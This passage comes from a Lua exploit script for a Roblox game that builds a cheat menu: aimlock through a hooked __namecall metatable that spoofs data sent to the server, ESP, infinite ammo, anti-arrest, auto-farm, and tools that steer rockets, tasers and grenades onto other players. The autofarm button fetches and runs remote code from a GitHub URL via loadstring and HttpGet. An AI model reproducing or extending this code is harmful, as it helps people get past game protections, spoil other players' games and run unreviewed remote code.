                        Found = true
                        MainEvent:FireServer('Block', player.Name)
                    end
                end
            end
            if Found == false and HoldingF == false then
                if player.Character.BodyEffects:FindFirstChild('Block') then player.Character.BodyEffects.Block:Destroy() end
            end
        end;
        local Start = function()
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;
        local Pause = function()
            Loop:Disconnect()
        end;
        Start()	
        repeat wait() until AutoBlockColor.BackgroundColor3 == red
        Pause()
    else
        AutoBlockColor.BackgroundColor3 = red
    end
end)

AutoStompColor.BackgroundColor3 = red
AutoStomp.MouseButton1Click:Connect(function()
    if AutoStompColor.BackgroundColor3 == red then
        AutoStompColor.BackgroundColor3 = green
        local Loop
        local loopFunction = function()
            MainEvent:FireServer('Stomp')
        end;
        local Start = function()
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;
        local Pause = function()
            Loop:Disconnect()
        end;
        Start()	
        repeat wait() until AutoStompColor.BackgroundColor3 == red
        Pause()
    else
        AutoStompColor.BackgroundColor3 = red
    end
end)

AntiArrestColor.BackgroundColor3 = red
AntiArrest.MouseButton1Click:Connect(function()
    if AntiArrestColor.BackgroundColor3 == red then
        AntiArrestColor.BackgroundColor3 = green
        local Loop
        local loopFunction = function()
                for _,v in pairs(game:GetService('Players'):GetChildren()) do
                    if v.Character and v.DataFolder.Officer.Value == 1 then
                        if (v.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude <= 30 and player.Character.BodyEffects['K.O'].Value == true then
                            player.Character:Destroy()
                        end
                    end
                end 
        end;
        local Start = function()
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;
        local Pause = function()
            Loop:Disconnect()
        end;
        Start()	
        repeat wait() until AntiArrestColor.BackgroundColor3 == red
        Pause()
    else
        AntiArrestColor.BackgroundColor3 = red
    end
end)

AutoDropColor.BackgroundColor3 = red
AutoDrop.MouseButton1Click:Connect(function()
    if AutoDropColor.BackgroundColor3 == red then
        AutoDropColor.BackgroundColor3 = green
        local Loop
        local loopFunction = function()
            local DropAm = 10000
            if player.DataFolder.Currency.Value > 10000 then
                DropAm = '10000'
            else
                DropAm = tostring(player.DataFolder.Currency.Value)
            end
            local args = {
                'DropMoney',
                DropAm
            }
            MainEvent:FireServer(unpack(args))
        end;
        local Start = function()
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;
        local Pause = function()
            Loop:Disconnect()
        end;
        Start()	
        repeat wait() until AutoDropColor.BackgroundColor3 == red
        Pause()
    else
        AutoDropColor.BackgroundColor3 = red
    end
end)

HideUserColor.BackgroundColor3 = red
HideUser.MouseButton1Click:Connect(function()
    if HideUserColor.BackgroundColor3 == red then
        HideUserColor.BackgroundColor3 = green
        NamePos = player.Character.HumanoidRootPart.CFrame
            local Loop
            local loopFunction = function()
                local WearingMask = player.Character:FindFirstChild('In-gameMask')
                local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')
                if not WearingMask then
                    local OwnsMask = player.Character:FindFirstChild('Mask') or player.Backpack:FindFirstChild('Mask')
                    if OwnsMask then
                        local MaskInventory = player.Backpack:FindFirstChild('Mask')
                        if MaskInventory then
                            Humanoid:EquipTool(MaskInventory)
                            wait(0.1)
                        end
                        OwnsMask:Activate()
                    else
                        local ItemName = 'Mask'
                        local ItemCost = 60
                        local ClickDetector = game:GetService("Workspace").Ignored.Shop["[Paintball Mask] - $60"].ClickDetector
                        local Location = game:GetService("Workspace").Ignored.Shop["[Paintball Mask] - $60"].Head.Position
                        local function buy()
                            wait()
                            player.Character.HumanoidRootPart.CFrame = CFrame.new(Location)
                            fireclickdetector(ClickDetector)
                            if not player.Character.LeftHand:FindFirstChild('LeftWrist') then
                                player.Character.LeftHand.Position = player.Character.LeftLowerArm.Position
                                player.Character.RightHand.Position = player.Character.RightLowerArm.Position
                            end
                        end
                        repeat buy() until player.Backpack:FindFirstChild(ItemName) or player.DataFolder.Currency.Value <= ItemCost or player.Character:FindFirstChild(ItemName)
                        player.Character.HumanoidRootPart.CFrame = NamePos
                        if not player.Character.LeftHand:FindFirstChild('LeftWrist') then
                            player.Character.LeftHand.Position = player.Character.LeftLowerArm.Position
                            player.Character.RightHand.Position = player.Character.RightLowerArm.Position
                        end
                    end
                else
                    local MaskVisible = player.Character:FindFirstChild('In-gameMask'):FindFirstChild('Handle')
                    if MaskVisible then
                        MaskVisible:Destroy()
                    end
                end
            end;
            local Start = function()
                Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
            end;
            local Pause = function()
                Loop:Disconnect()
            end;
            Start()	
            repeat wait() until HideUserColor.BackgroundColor3 == red
            Pause()
    else
        HideUserColor.BackgroundColor3 = red
    end
end)

AntiBagColor.BackgroundColor3 = red
AntiBag.MouseButton1Click:Connect(function()
    if AntiBagColor.BackgroundColor3 == red then
        AntiBagColor.BackgroundColor3 = green
            local Loop
            local loopFunction = function()
                if player.Character:FindFirstChild('Christmas_Sock') then
                   player.Character:FindFirstChild('Christmas_Sock'):Destroy() 
                end
            end;
            local Start = function()
                Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
            end;
            local Pause = function()
                Loop:Disconnect()
            end;
            Start()	
            repeat wait() until AntiBagColor.BackgroundColor3 == red
            Pause()
    else
        AntiBagColor.BackgroundColor3 = red
    end
end)

AltArmorColor.BackgroundColor3 = red
AltArmor.MouseButton1Click:Connect(function()
    if AltArmorColor.BackgroundColor3 == red then
        AltArmorColor.BackgroundColor3 = green
        
    else
        AltArmorColor.BackgroundColor3 = red
    end
end)

RocketRideColor.BackgroundColor3 = red
RocketRide.MouseButton1Click:Connect(function()
    if RocketRideColor.BackgroundColor3 == red then
        RocketRideColor.BackgroundColor3 = green
            local Loop
            local loopFunction = function()
                local Rocket = game:GetService('Workspace'):FindFirstChild('Ignored'):FindFirstChild('MyLauncher')
                if Rocket and COOLDOWN == true then
                    local RocketPart = game:GetService('Workspace'):FindFirstChild('Ignored'):FindFirstChild('RocketPart')
                    if not RocketPart then
                        local RocketPart = Instance.new('Part', game.Workspace.Ignored)
                        RocketPart.Name = 'RocketPart'
                        RocketPart.Anchored = true
                        RocketPart.CanCollide = true
                        RocketPart.Transparency = 1
                        RocketPart.Position = Vector3.new(Rocket.Position.X, Rocket.Position.Y + 1.4, Rocket.Position.Z)
                        player.Character.HumanoidRootPart.CFrame = CFrame.new(RocketPart.Position.X, RocketPart.Position.Y + 2, RocketPart.Position.Z) * CFrame.Angles(math.rad(player.Character.HumanoidRootPart.Orientation.X),math.rad(player.Character.HumanoidRootPart.Orientation.Y),math.rad(player.Character.HumanoidRootPart.Orientation.Z))
                        RIDING = true
                    else
                        RocketPart.Position = Vector3.new(Rocket.Position.X, Rocket.Position.Y + 1.4, Rocket.Position.Z)
                        player.Character.HumanoidRootPart.CFrame = CFrame.new(RocketPart.Position.X, RocketPart.Position.Y + 2.3, RocketPart.Position.Z) * CFrame.Angles(math.rad(player.Character.HumanoidRootPart.Orientation.X),math.rad(player.Character.HumanoidRootPart.Orientation.Y),math.rad(player.Character.HumanoidRootPart.Orientation.Z))
                        RIDING = true
                    end
                else
                    for i,v in pairs(game:GetService('Workspace'):FindFirstChild('Ignored'):GetChildren()) do
                        if v.Name == 'RocketPart' then
                           v:Destroy() 
                        end
                        RIDING = false
                    end
                end
            end;
            local Start = function()
                Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
            end;
            local Pause = function()
                Loop:Disconnect()
            end;
            Start()	
            repeat wait() until RocketRideColor.BackgroundColor3 == red
            Pause()
    else
        RocketRideColor.BackgroundColor3 = red
    end
end)

AntiGrabColor.BackgroundColor3 = red
AntiGrab.MouseButton1Click:Connect(function()
    if AntiGrabColor.BackgroundColor3 == red then
        AntiGrabColor.BackgroundColor3 = green
            local Loop
            local loopFunction = function()
                local GC = player.Character:FindFirstChild("GRABBING_CONSTRAINT")
                if GC then
                    GC:Destroy()
                    wait(0.04)
                    player.Character:FindFirstChildWhichIsA('Humanoid').Sit = true
                end
            end;
            local Start = function()
                Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
            end;
            local Pause = function()
                Loop:Disconnect()
            end;
            Start()	
            repeat wait() until AntiGrabColor.BackgroundColor3 == red
            Pause()
    else
        AntiGrabColor.BackgroundColor3 = red
    end
end)

AntiEffectsColor.BackgroundColor3 = red
AntiEffects.MouseButton1Click:Connect(function()
    if AntiEffectsColor.BackgroundColor3 == red then
        AntiEffectsColor.BackgroundColor3 = green
        player.PlayerGui.Framework.FBAnimation.Name = 'yea'
            local Loop
            local loopFunction = function()
                local Particle = player.Character.UpperTorso:FindFirstChild('ElectricuteParticle') or player.Character.UpperTorso:FindFirstChild('FlamethrowerFireParticle')
                if Particle then Particle:Destroy() end
                for i,v in pairs(player.Character:FindFirstChildWhichIsA('Humanoid'):GetPlayingAnimationTracks()) do
                    if v.Animation.AnimationId == 'rbxassetid://5641749824' then
                       v:Stop() 
                    end
                end
            end;
            local Start = function()
                Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
            end;
            local Pause = function()
                Loop:Disconnect()
            end;
            Start()	
            repeat wait() until AntiEffectsColor.BackgroundColor3 == red
            Pause()
    else
        AntiEffectsColor.BackgroundColor3 = red
        player.PlayerGui.Framework.yea.Name = 'FBAnimation'
    end
end)

------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------

--Rpg Variables--
DS = 75
DT = 5
RpgTimer = DS
Distance = DT
RPGTarget = 'None'
-----------------


local mt = getrawmetatable(game) -- aimlok
pos = Vector3.new(0,0,0)
local old = mt.__namecall
setreadonly(mt,false)
mt.__namecall = newcclosure(function(self, ...)
  local args = {...}
  if getnamecallmethod() == 'FireServer' and self.Name == 'MainEvent' then
    if tostring(args[1]) == 'UpdateMousePos' then
        if Aimlocked ~= nil then
            args[2] = pos
        end
     end
  end
  return old(self, unpack(args))
end)


Invisible.MouseButton1Click:Connect(function()
    OldInvisCFrame = player.Character.HumanoidRootPart.CFrame
    player.Character.HumanoidRootPart.CFrame = CFrame.new(318.499, 93.825, -919.513)
    wait(0.1)
    player.Character:BreakJoints()
    wait(0.1)
    player.Character.HumanoidRootPart.CFrame = OldInvisCFrame
end)

Spin.MouseButton1Click:Connect(function()
    if Spin.Text == 'Spin' then
        Spin.Text = 'Unspin'
        local Loop
        local loopFunction = function()
            player.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(50), 0)
        end;
        local Start = function()
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;
        local Pause = function()
            Loop:Disconnect()
        end;
        Start()	
        repeat wait() until Spin.Text == 'Spin'
        Pause()
    else
        Spin.Text = 'Spin'
    end
end)

Users.MouseButton1Click:Connect(function()
    for i,v in pairs(game.Workspace.Players:GetChildren()) do
        v:FindFirstChildWhichIsA('Humanoid').DisplayDistanceType = 'Subject'
    end
    announce('Showing masked usersnames', '', 3)
end)

MoneyESP.MouseButton1Click:Connect(function()
    if MoneyESP.Text == 'MoneyESP' then
        MoneyESP.Text = 'UnmoneyESP'
        local Loop
        local loopFunction = function()
        for i,v in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
            if v.Name == 'MoneyDrop' then
                v.BillboardGui.AlwaysOnTop = true
                v.BillboardGui.Size = UDim2.new(0,25,0,25)
                end
            end
        end;
        local Start = function()
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;
        local Pause = function()
            Loop:Disconnect()
        end;
        Start()	
        repeat wait(1) until MoneyESP.Text == 'MoneyESP'
        Pause()
    else
        MoneyESP.Text = 'MoneyESP'
        for i,v in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
            if v.Name == 'MoneyDrop' then
                v.BillboardGui.AlwaysOnTop = false
                v.BillboardGui.Size = UDim2.new(1,0,1,0)
            end
        end
    end 
end)

Esp.MouseButton1Click:Connect(function()
    if Esp.Text == 'Esp' then
        Esp.Text = 'Unesp'
        local Loop
        local loopFunction = function()
            for _,v in pairs(Players:GetChildren()) do
                if v.Character then
                    if not v.Character.UpperTorso:FindFirstChild('ESP') then
                        local ESP = Instance.new('BillboardGui', v.Character.UpperTorso)
                        ESP.StudsOffset = Vector3.new(0,3,0)
                        ESP.Size = UDim2.new(4,0,1,0)
                        ESP.AlwaysOnTop = true
                        ESP.Name = 'ESP'
                        local TextLabel = Instance.new('TextLabel', ESP)
                        TextLabel.Text = (v.Name ..' | ' .. v.DisplayName)
                        TextLabel.BackgroundTransparency = 1
                        TextLabel.Size = UDim2.new(1,0,1,0)
                        TextLabel.TextColor3 = green
                    end
                end
            end        end;
        local Start = function()
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;
        local Pause = function()
            Loop:Disconnect()
        end;
        Start()	
        repeat wait() until Esp.Text == 'Esp'
        Pause()
    else
        Esp.Text = 'Esp'
        for _,v in pairs(Players:GetChildren()) do
            if v.Character then
                if v.Character.UpperTorso:FindFirstChild('ESP') then
                    v.Character.UpperTorso:FindFirstChild('ESP'):Destroy()
                end
            end
        end
    end
end)

HighTool.MouseButton1Click:Connect(function()
    if player.Character:FindFirstChildWhichIsA('Tool') then
        player.Character:FindFirstChildWhichIsA('Tool').Grip = CFrame.new(0, -12, 0, 1, 0, 0, 0, 1, 0, 0, 0, -1)
    else
        announce('HighTool Error', 'you have to be holding a tool', 5)
    end
end)

LastingBullets.MouseButton1Click:Connect(function()
    if player.Character:FindFirstChildWhichIsA('Tool') then
        if player.Character:FindFirstChildWhichIsA('Tool'):FindFirstChild('Handle'):FindFirstChildWhichIsA('BillboardGui') then
            player.Character:FindFirstChildWhichIsA('Tool'):FindFirstChild('Handle'):FindFirstChildWhichIsA('BillboardGui'):Destroy()
        else
            announce('LastingBullets Error', 'you have to be holding a gun', 5)
        end
    else
        announce('LastingBullets Error', 'you have to be holding a gun', 5)
    end
end)

Stamina.MouseButton1Click:Connect(function()
    if Stamina.Text == 'Stamina' then
        Stamina.Text = 'Unstamina'
    else
        Stamina.Text= 'Stamina'
    end
end)

SwagUsers.MouseButton1Click:Connect(function()
    local TOTAL = 0
    for i,v in pairs(game.Workspace.Players:GetChildren()) do
        if not v.UpperTorso:FindFirstChild('OriginalSize') then
            if v.Name ~= player.Name then
                TOTAL = TOTAL + 1
            end
        end
    end
    if TOTAL > 0 then
        announce('Found','A total of ' .. tostring(TOTAL) .. ' of swag mode players', 3)
    else
        announce('D:', 'no swag mode users found', 3)
    end
end)

Aimlock.MouseButton1Click:Connect(function()
    if Aimlock.Text == 'Aimlock' then
        Aimlock.Text = 'Unaimlock'
        announce('Aimlock Enabled', 'press e to aimlock', 3)
        local Loop
        local loopFunction = function()
            local enemy = game.Players:FindFirstChild(Aimlocked).Character
            if enemy then
                local pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
                local split = string.split(pingvalue,'(')
                local ping = tonumber(split[1]) 
                local xchange
                local zchange
                if ping < 70 then
                    increase = 0.4
                elseif ping < 140 then
                    increase = 0.57
                elseif ping < 200 then
                    increase = 0.7
                elseif ping < 350 then
                    increase = 1.2
                else 
                    increase = 1.6
                end
                if enemy.Humanoid.MoveDirection.X < 0 then
                    xchange = -increase
                elseif enemy.Humanoid.MoveDirection.X > 0 then
                    xchange = increase
                else
                    xchange = 0
                end
                if enemy.Humanoid.MoveDirection.Z < 0 then
                    zchange = -increase
                elseif enemy.Humanoid.MoveDirection.Z > 0 then
                    zchange = increase
                else
                    zchange = 0
                end
                pos = Vector3.new(enemy.Head.Position.X + enemy.Humanoid.MoveDirection.X + xchange, enemy.Head.Position.Y, enemy.Head.Position.Z + enemy.Humanoid.MoveDirection.Z + zchange)
            else
                pos = mouse.Hit.p
            end
        end;
        local Start = function()
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;
        local Pause = function()
            Loop:Disconnect()
        end;
        Start()	
        repeat wait() until Aimlock.Text == 'Aimlock'
        Pause()
    else
        Aimlock.Text = 'Aimlock'
        Aimlocked = nil
    end
end)

AutoFarmWarning = false
Autofarm.MouseButton1Click:Connect(function()
    if AutoFarmWarning == false then
        AutoFarmWarning = true
        announce('Autofarm Warning', 'press again to begin autofarming, this CANNOT be stopped', 10)
    else
        announce('Starting Autofarm', ':D', 5)
        loadstring(game:HttpGet("https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagAutofarm"))()
    end
end)

Unban.MouseButton1Click:Connect(function()
    local localPlayer = game:GetService('Players').LocalPlayer;
    local localCharacter = localPlayer.Character;
    localCharacter:FindFirstChildOfClass('Humanoid').Health = 0;
    localCharacter:ClearAllChildren()
    local newCharacter = localPlayer.CharacterAdded:Wait();
    local spoofFolder = Instance.new('Folder');
    spoofFolder.Name = 'FULLY_LOADED_CHAR';
    spoofFolder.Parent = newCharacter;
    newCharacter:WaitForChild('RagdollConstraints'):Destroy();
    local spoofValue = Instance.new('BoolValue', newCharacter);
    spoofValue.Name = 'RagdollConstraints';
end)

FullGod.MouseButton1Click:Connect(function()

end)

        
TazerTarget = nil
GrenadeTarget = nil
LockTools.MouseButton1Click:Connect(function()
    local function rpglock()
        local RpgTool = Instance.new('Tool', player.Backpack)
        RpgTool.ToolTip = 'Click a player to rpg lock them'
        RpgTool.CanBeDropped = false
        RpgTool.RequiresHandle = false
        RpgTool.Name = 'Rpg Lock'
        
        RpgTool.Activated:Connect(function()
            local LowerTorso = mouse.Target.Parent:FindFirstChild('LowerTorso')
            if not LowerTorso then
                LowerTorso = mouse.Target.Parent.Parent:FindFirstChild('LowerTorso')
            end
            if LowerTorso then
                if LowerTorso.Parent.Name == 'SpecialParts' then
                    RPGTarget = LowerTorso.Parent.Parent.Parent.Name
                else
                    RPGTarget = LowerTorso.Parent.Name
                end
                announce('Rpg locked onto', RPGTarget, 3)
            else
                RPGTarget = nil
                announce('Rpg unlocked', '', 3)
            end
        end)
    end
    local function grenadelock()
        local GrenadeTool = Instance.new('Tool', player.Backpack)
        GrenadeTool.ToolTip = 'Click a player to grenade lock them'
        GrenadeTool.CanBeDropped = false
        GrenadeTool.RequiresHandle = false
        GrenadeTool.Name = 'Grenade Lock'
        
        GrenadeTool.Activated:Connect(function()
            local LowerTorso = mouse.Target.Parent:FindFirstChild('LowerTorso')
            if not LowerTorso then
                LowerTorso = mouse.Target.Parent.Parent:FindFirstChild('LowerTorso')
            end
            if LowerTorso then
                if LowerTorso.Parent.Name == 'SpecialParts' then
                    GrenadeTarget = LowerTorso.Parent.Parent.Parent.Name
                else
                    GrenadeTarget = LowerTorso.Parent.Name
                end
                announce('Grenades locked onto', GrenadeTarget, 5)
            else
                TazerTarget = nil
                announce('Grenades unlocked', '', 3)
            end
        end)
    end
    local function taserlock()
        local TazerTool = Instance.new('Tool', player.Backpack)
        TazerTool.ToolTip = 'Click a player to tazer lock them'
        TazerTool.CanBeDropped = false
        TazerTool.RequiresHandle = false
        TazerTool.Name = 'Tazer Lock'

        TazerTool.Activated:Connect(function()
            local LowerTorso = mouse.Target.Parent:FindFirstChild('LowerTorso')
            if not LowerTorso then
                LowerTorso = mouse.Target.Parent.Parent:FindFirstChild('LowerTorso')
            end
            if LowerTorso then
                if LowerTorso.Parent.Name == 'SpecialParts' then
                    TazerTarget = LowerTorso.Parent.Parent.Parent.Name
                else
                    TazerTarget = LowerTorso.Parent.Name
                end
                announce('Taser locked onto', TazerTarget, 5)
            else
                TazerTarget = nil
                announce('Taser unlocked', '', 3)
            end
        end)
    end
    
    taserlock()
    rpglock()
    grenadelock()
    
    local Loop
    local loopFunction = function()
            if RPGTarget ~= nil then
                local Launcher = game:GetService('Workspace'):FindFirstChild('Ignored'):FindFirstChild('Launcher') or game:GetService('Workspace'):FindFirstChild('Ignored'):FindFirstChild('MyLauncher')
                local TargetRPG1 = game:GetService('Workspace').Players:FindFirstChild(RPGTarget)
                if Launcher and TargetRPG1 then
                    local TargetRPG = TargetRPG1:FindFirstChild('HumanoidRootPart')
                    if TargetRPG then
                        if RpgTimer >= 0 then
                            Launcher.CFrame = CFrame.new(TargetRPG.Position.X, TargetRPG.Position.Y + 5, TargetRPG.Position.Z)
                            RpgTimer = RpgTimer - 1
                        else
                            Launcher.CFrame = CFrame.new(TargetRPG.Position.X, TargetRPG.Position.Y + Distance, TargetRPG.Position.Z)
                            Distance = Distance - 1
                        end
                    else
                        RpgTimer = DS 
                        Distance = DT
                    end
                else
                    RpgTimer = DS 
                    Distance = DT
                end
            end
            if TazerTarget ~= nil then
                if player.Character:FindFirstChild('[Taser]') then
                    local Part = player.Character['[Taser]']:FindFirstChild('Handle'):FindFirstChild('Part')
                    if Part then
                        local FindPlayer = game.Workspace.Players:FindFirstChild(TazerTarget):FindFirstChild('UpperTorso') or game.Workspace:FindFirstChild(TazerTarget):FindFirstChild('UpperTorso') 
                        if FindPlayer then
                            Part.Position = FindPlayer.Position
                        end
                    end
                end
            end
            if GrenadeTarget ~= nil then
                print('lookin')
                local Handle = game.Workspace['Ignored']:FindFirstChild('Handle')
                local FindPlayer = Players:FindFirstChild(GrenadeTarget)
                if Handle and FindPlayer then
                    if FindPlayer.Character then
                        Handle.Position = FindPlayer.Character.UpperTorso.Position
                    end
                end
            end
    end;
    local Start = function()
        Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
    end;
    local Pause = function()
        Loop:Disconnect()
    end;
    Start()	
    repeat wait() until not player.Character or player.Character:FindFirstChildOfClass('Humanoid').Died == true
    Pause()
end)

InfTools.MouseButton1Click:Connect(function()
    announce('Infinite Ammo Given', 'hold the tool to buy ammo shoot without reloading', 8)
    function infrev()
        if player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA') then
            player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').TextLabel.Name = 'AmmoText'
            player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Position = UDim2.new(2,0,2,0)
            player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Size = UDim2.new(0,0,0,0)
            player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Name = 'AmmoFrame'
        end
        
        local Gun = '[Revolver]'
        local GunTexture = 'rbxassetid://3420082920'
        local GunPath = game:GetService("Workspace").Ignored.Shop["[Revolver] - $1300"].Head
        local Holding = false
        
        local InfiniteTool = Instance.new('Tool', player.Backpack)
        InfiniteTool.Name = 'Rev'
        InfiniteTool.ToolTip = 'buy guns while holding, shoot while using this tool'
        InfiniteTool.TextureId = GunTexture
        InfiniteTool.RequiresHandle = true
        InfiniteTool.CanBeDropped = false
        
        local Handle = Instance.new('Part', InfiniteTool)
        Handle.Name = 'Handle'
        Handle.Anchored = false
        Handle.Size = Vector3.new(0,0,0)
        Handle.Massless = true
        Handle.Transparency = 1
        Handle.CanCollide = false
        
        InfiniteTool.Equipped:Connect(function()
            Holding = true
            player.PlayerGui.MainScreenGui:FindFirstChild('AmmoFrame').Name = 'AmmoFrame2'
            for i,v in pairs(player.Backpack:GetChildren()) do
                if v.Name == Gun and not player.Character:FindFirstChild(Gun) then
                    if v.Ammo.Value > 0 then
                        v.Parent = player.Character
                    end
                end
            end
            while Holding == true do
                wait(0)
                local TotalAmmo = 0
                for i,v in pairs(player.Backpack:GetChildren()) do
                    if v.Name == Gun then
                        TotalAmmo = TotalAmmo + v.Ammo.Value
                    end
                end
                for i,v in pairs(player.Character:GetChildren()) do
                    if v.Name == Gun then
                        TotalAmmo = TotalAmmo + v.Ammo.Value
                    end
                end
                player.PlayerGui.MainScreenGui.AmmoFrame2.AmmoText.Text = tostring(TotalAmmo)
                player.PlayerGui.MainScreenGui.AmmoFrame2.AmmoText.Visible = true
                player.PlayerGui.MainScreenGui.AmmoFrame2.Visible = true
                local mag = (GunPath.Position - player.Character.HumanoidRootPart.Position).Magnitude
                if mag <= 8 and player.Character:FindFirstChild(InfiniteTool.Name) then
                    for i,v in pairs(player.Backpack:GetChildren()) do
                        if v.Name == Gun then
                            v.Parent = player.Character
                        end
                    end
                end
                fireclickdetector(GunPath.Parent.ClickDetector)
                if player.Character:FindFirstChild(Gun).Ammo.Value < 1 then
                    player.Character:FindFirstChild(Gun).Parent = player.Backpack
                    for i,v in pairs(player.Backpack:GetChildren()) do
                        if v.Name == Gun and not player.Character:FindFirstChild(Gun) then
                            if v.Ammo.Value > 0 then
                                v.Parent = player.Character
                            end
                        end
                    end
                end
            end
        end)
        InfiniteTool.Unequipped:Connect(function()
            Holding = false
            player.PlayerGui.MainScreenGui:FindFirstChild('AmmoFrame2').Name = 'AmmoFrame'
        end)
    end
    function infdb()
        if player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA') then
            player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').TextLabel.Name = 'AmmoText'
            player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Position = UDim2.new(2,0,2,0)
            player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Size = UDim2.new(0,0,0,0)
            player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Name = 'AmmoFrame'
        end
        
        local Gun = '[Double-Barrel SG]'
        local GunTexture = 'rbxassetid://5341886203'
        local GunPath = game:GetService("Workspace").Ignored.Shop["[Double-Barrel SG] - $1400"].Head
        local Holding = false
        
        local InfiniteTool = Instance.new('Tool', player.Backpack)
        InfiniteTool.Name = 'Db'
        InfiniteTool.ToolTip = 'buy guns while holding, shoot while using this tool'
        InfiniteTool.TextureId = GunTexture
        InfiniteTool.RequiresHandle = true
        InfiniteTool.CanBeDropped = false
        
        local Handle = Instance.new('Part', InfiniteTool)
        Handle.Name = 'Handle'
        Handle.Anchored = false
        Handle.Size = Vector3.new(0,0,0)
        Handle.Massless = true
        Handle.Transparency = 1
        Handle.CanCollide = false
        
        InfiniteTool.Equipped:Connect(function()
            Holding = true
            player.PlayerGui.MainScreenGui:FindFirstChild('AmmoFrame').Name = 'AmmoFrame2'
            for i,v in pairs(player.Backpack:GetChildren()) do
                if v.Name == Gun and not player.Character:FindFirstChild(Gun) then
                    if v.Ammo.Value > 0 then
                        v.Parent = player.Character
                    end
                end
            end
            while Holding == true do
                wait(0)
                local TotalAmmo = 0
                for i,v in pairs(player.Backpack:GetChildren()) do
                    if v.Name == Gun then
                        TotalAmmo = TotalAmmo + v.Ammo.Value
                    end
                end
                for i,v in pairs(player.Character:GetChildren()) do
                    if v.Name == Gun then
                        TotalAmmo = TotalAmmo + v.Ammo.Value
                    end
                end
                player.PlayerGui.MainScreenGui.AmmoFrame2.AmmoText.Text = tostring(TotalAmmo)
                player.PlayerGui.MainScreenGui.AmmoFrame2.AmmoText.Visible = true
                player.PlayerGui.MainScreenGui.AmmoFrame2.Visible = true
                local mag = (GunPath.Position - player.Character.HumanoidRootPart.Position).Magnitude
                if mag <= 8 and player.Character:FindFirstChild(InfiniteTool.Name) then
                    for i,v in pairs(player.Backpack:GetChildren()) do
                        if v.Name == Gun then
                            v.Parent = player.Character
                        end
                    end
                end
                fireclickdetector(GunPath.Parent.ClickDetector)
                if player.Character:FindFirstChild(Gun).Ammo.Value < 1 then
                    player.Character:FindFirstChild(Gun).Parent = player.Backpack
                    for i,v in pairs(player.Backpack:GetChildren()) do
                        if v.Name == Gun and not player.Character:FindFirstChild(Gun) then
                            if v.Ammo.Value > 0 then
                                v.Parent = player.Character
                            end
                        end
                    end
                end
            end
        end)
        InfiniteTool.Unequipped:Connect(function()
            Holding = false
            player.PlayerGui.MainScreenGui:FindFirstChild('AmmoFrame2').Name = 'AmmoFrame'
        end)
    end
    function infrpg()
        if player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA') then
            player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').TextLabel.Name = 'AmmoText'
            player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Position = UDim2.new(2,0,2,0)
            player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Size = UDim2.new(0,0,0,0)
            player.PlayerGui.MainScreenGui:FindFirstChild('BattleRoyaleFFA').Name = 'AmmoFrame'
        end
        
        local Gun = '[RPG]'
        local GunTexture = 'rbxassetid://3420083215'
        local GunPath = game:GetService("Workspace").Ignored.Shop["[RPG] - $6000"].Head
        local Holding = false
        
        local InfiniteTool = Instance.new('Tool', player.Backpack)
        InfiniteTool.Name = 'Rpg'
        InfiniteTool.ToolTip = 'buy guns while holding, shoot while using this tool'
        InfiniteTool.TextureId = GunTexture
        InfiniteTool.RequiresHandle = true
        InfiniteTool.CanBeDropped = false
        
        local Handle = Instance.new('Part', InfiniteTool)
        Handle.Name = 'Handle'
        Handle.Anchored = false
        Handle.Size = Vector3.new(0,0,0)
        Handle.Massless = true
        Handle.Transparency = 1
        Handle.CanCollide = false
        
        InfiniteTool.Equipped:Connect(function()
            Holding = true
            player.PlayerGui.MainScreenGui:FindFirstChild('AmmoFrame').Name = 'AmmoFrame2'
            for i,v in pairs(player.Backpack:GetChildren()) do
                if v.Name == Gun and not player.Character:FindFirstChild(Gun) then
                    if v.Ammo.Value > 0 then
                        v.Parent = player.Character
                    end
                end
            end
            while Holding == true do
                wait(0)
                local TotalAmmo = 0
                for i,v in pairs(player.Backpack:GetChildren()) do
                    if v.Name == Gun then
                        TotalAmmo = TotalAmmo + v.Ammo.Value
                    end
                end
                for i,v in pairs(player.Character:GetChildren()) do
                    if v.Name == Gun then
                        TotalAmmo = TotalAmmo + v.Ammo.Value
                    end
                end
